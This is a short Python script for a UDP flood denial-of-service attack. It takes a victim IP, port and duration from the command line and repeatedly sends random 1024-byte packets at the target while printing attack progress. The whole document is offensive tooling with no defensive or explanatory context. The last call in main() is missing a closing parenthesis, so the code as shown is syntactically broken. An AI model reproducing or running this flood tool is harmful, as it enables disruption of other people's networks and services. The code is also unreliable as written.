import time, socket, sys, random

def help():
	print("Command: " + sys.argv[0] + " IP PORT TIME")

def doss(victim, vport, duration):
	server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1024)
	timeout = (time.time() + duration)
	sent = (1)

	try:
		while True:
			if (time.time() > timeout):
				break

			else:
				pass

			server.sendto(bytes, (victim, vport))
			sent = (sent + 1)
			print("Attacking ", str(victim), " sent packages ", str(sent), " at port: ", str(vport))
	
	except KeyboardInterrupt:
		sys.exit()


def main():
	if len(sys.argv) != 4:
		help()
	
	else:
		doss(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])

if __name__ == '__main__':

	main()

